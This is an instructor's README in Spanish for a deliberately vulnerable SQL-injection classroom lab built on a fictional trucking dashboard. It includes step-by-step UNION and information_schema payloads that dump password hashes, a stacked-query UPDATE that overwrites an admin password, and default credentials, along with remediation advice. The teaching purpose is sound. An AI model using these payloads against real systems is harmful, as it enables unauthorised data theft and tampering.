# 🚛 TransAndes Analytics — Laboratorio de Inyección SQL

App de demostración para una **actividad práctica de seguridad**. Por fuera parece
un panel normal de estadísticas de una flota de camiones; por dentro tiene una
página de búsqueda **deliberadamente vulnerable a inyección SQL**.

> ⚠️ **Inseguro a propósito.** No usar con datos reales ni exponer a Internet.
> Todos los datos son ficticios. Pensado para correr en `localhost` durante clase.

Esta app **no tiene ninguna relación con _faro_**: usa su propia base de datos,
su propia red y sus propios puertos.

> 📄 **Este README es la guía del profesor** (incluye la solución y las claves en
> claro). La **hoja para los alumnos** es [`ACTIVIDAD.md`](ACTIVIDAD.md): repárte
> solo ese archivo + la URL del lab. No entregues `README.md` ni la carpeta `db/`
> (contienen las respuestas y los hashes/claves).

---

## 🎯 Objetivos de aprendizaje

Los estudiantes parten viendo "una app normal" y deben:

1. Descubrir **cuál** de las entradas de texto es inyectable (solo `/buscar` lo es).
2. Confirmar la vulnerabilidad y deducir la estructura de la consulta.
3. Usar `UNION` para **leer tablas que la app jamás muestra**.
4. Enumerar el catálogo (`information_schema`) para **descubrir nombres de tablas**
   sensibles que están escondidas detrás de vistas.
5. Extraer **hashes de contraseñas** de conductores y administradores, y crackearlos.
6. Leer **operaciones clasificadas** (carga real, contratos, escoltas).
7. Comprobar que el rol de la app está **sobre-privilegiado** y, con _stacked
   queries_, **modificar** datos sensibles conociendo el nombre de la tabla.
8. Proponer las correcciones: consultas parametrizadas + mínimo privilegio.

---

## ▶️ Cómo levantarlo

Requisitos: Docker + Docker Compose.

```bash
cd sqli-lab
docker compose up --build
```

- App web → <http://localhost:4000>
- PostgreSQL → `localhost:5434`
  - Superusuario: `postgres` / `postgres`
  - Rol de la app (sobre-privilegiado): `fleet_app` / `fleet_app_pw`

Para **reiniciar la base** después de que los alumnos la modifiquen (los scripts
de `db/` solo corren con la BD vacía):

```bash
docker compose down -v && docker compose up --build
```

---

## 🚀 Deploy (opcional)

Para exponerlo más allá de `localhost`, en `deploy/`:

- **Subdominio propio con TLS** (recomendado, más seguro) → [`deploy/README.md`](deploy/README.md)
- **Bajo un path del host de faro** (`/sqli-lab`, reusando su nginx-proxy) → [`deploy/README-path.md`](deploy/README-path.md)

Ambos dejan la BD sin puertos públicos y agregan auth básica. Recuerda: es una
app vulnerable a propósito → host aislado, time-box y `down -v` entre clases.

---

## 🗺️ Arquitectura

```
sqli-lab/
├── docker-compose.yml        # Postgres + app, aislados (uso local)
├── db/                       # se ejecuta en orden al crear la BD
│   ├── 01_schema.sql         # esquema lod: trucks, drivers (+ datos sensibles), trips…
│   ├── 02_sensitive.sql      # tablas "tesoro": driver_credentials, admin_accounts, classified_operations
│   ├── 03_seed.sql           # datos sintéticos (incluye los hashes débiles)
│   ├── 04_views.sql          # esquema app: 3 VISTAS que esconden info sensible
│   └── 05_roles.sql          # rol fleet_app SOBRE-PRIVILEGIADO (la falla de fondo)
├── app/                      # Node + Express + EJS + pg
│   ├── server.js             # rutas; /buscar concatena el input => vulnerable; BASE_PATH-aware
│   ├── db.js                 # se conecta como fleet_app
│   └── views/                # dashboard, flota, conductores, rutas, buscar
└── deploy/                   # subdominio (Caddy) o path en el nginx de faro
```

### Las 3 vistas (lo que la app **sí** muestra)

| Vista                      | Qué expone                                   | Qué **esconde**                                    |
|----------------------------|----------------------------------------------|----------------------------------------------------|
| `app.v_fleet_overview`     | estadísticas por camión                      | —                                                  |
| `app.v_driver_leaderboard` | ranking de conductores (nombre + inicial)    | apellido, RUN, dirección, sueldo, **password_hash**|
| `app.v_route_economics`    | economía por ruta                            | —                                                  |

### Las tablas sensibles (lo que la app **nunca** muestra)

- `lod.drivers` → incluye `national_id`, `home_address`, `base_salary_clp`, `password_hash`.
- `lod.driver_credentials` → usuario + `password_hash` (MD5) + MFA de cada conductor.
- `lod.admin_accounts` → cuentas del backoffice + `password_hash` (MD5).
- `lod.classified_operations` → carga real vs. declarada, valor del contrato, escoltas.

**La idea pedagógica:** las vistas esconden columnas, pero el rol `fleet_app`
puede leer y escribir todo el esquema `lod`. Si el código concatena la entrada
del usuario, las vistas no protegen nada.

---

## 🧪 Camino de explotación sugerido (solución del profesor)

Todo ocurre en la página **Buscar** (`/buscar`). La consulta interna es,
aproximadamente:

```sql
SELECT unit_number, make, model_year::text, status, total_miles::text
FROM app.v_fleet_overview
WHERE (unit_number || ' ' || make || ' ' || home_terminal) ILIKE '%<TU_INPUT>%'
ORDER BY unit_number
```

> En PostgreSQL los comentarios son `--` (no `#`). Hay **5 columnas**, todas de
> tipo texto, así que los valores numéricos deben castearse con `::text`.

**1. Detectar la inyección** — escribe una comilla y observa el error de la BD:
```
'
```

**2. Contar columnas:**
```
' ORDER BY 5-- 
' ORDER BY 6--        (esto debe fallar)
```

**3. Confirmar UNION:**
```
' UNION SELECT 'a','b','c','d','e'-- 
```

**4. Descubrir los nombres de tablas escondidas:**
```
' UNION SELECT table_schema, table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema='lod'-- 
```

**5. Ver las columnas de una tabla interesante:**
```
' UNION SELECT column_name, data_type, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='driver_credentials'-- 
```

**6. Robar credenciales de conductores:**
```
' UNION SELECT username, password_hash, role, COALESCE(mfa_secret,''), driver_id FROM lod.driver_credentials-- 
```

**7. Robar cuentas de administración:**
```
' UNION SELECT username, password_hash, role, email, full_name FROM lod.admin_accounts-- 
```

**8. Crackear los MD5** (p.ej. en crackstation.net). Salen al tiro: `123456`,
`password`, `qwerty`, `admin123`, …

**9. Leer operaciones clasificadas:**
```
' UNION SELECT client_codename, real_cargo_description, security_level, contract_value_clp::text, special_instructions FROM lod.classified_operations-- 
```

**10. MODIFICAR datos (stacked query)** — el rol puede escribir, así que conocido
el nombre de la tabla se puede alterar su contenido:
```
'; UPDATE lod.admin_accounts SET password_hash = md5('intervenido') WHERE username='admin'; -- 
```
Verifica el cambio:
```
' UNION SELECT username, password_hash, role, NULL, NULL FROM lod.admin_accounts WHERE username='admin'-- 
```
(También se puede `UPDATE lod.classified_operations …`, subir un sueldo en
`lod.drivers`, etc. Para deshacer el desastre: `docker compose down -v`.)

---

## 🔐 Claves en claro (solo para el profesor)

**Conductores** (`lod.driver_credentials`):

| usuario   | clave       | · | usuario   | clave       |
|-----------|-------------|---|-----------|-------------|
| crojas    | `123456`    | · | bcastro   | `flota2025` |
| mfuentes  | `password`  | · | jmorales  | `javiera1`  |
| vsoto     | `qwerty`    | · | sreyes    | `santiago`  |
| jmunoz    | `camion123` | · | fvega     | `fernanda`  |
| adiaz     | `antonia`   | · | therrera  | `tomas2025` |

**Administradores** (`lod.admin_accounts`):

| usuario      | clave       |
|--------------|-------------|
| admin        | `admin123`  |
| operaciones  | `flota2025` |
| ti.soporte   | `password`  |
| auditor      | `123456`    |

---

## ✅ Cómo se arregla (cierre de la actividad)

1. **Consultas parametrizadas.** Compara `/buscar` (concatena) con `/flota` y
   `/conductores` (usan `$1`, no inyectables). Es exactamente el mismo patrón
   bien hecho.
2. **Mínimo privilegio.** `fleet_app` debería tener solo `SELECT` sobre las 3
   vistas de `app`, nunca acceso de lectura/escritura a `lod`.
3. **Defensa en profundidad.** Vistas con `security_invoker`, no mostrar errores
   crudos de la BD al usuario, listas blancas de columnas para ordenar, etc.
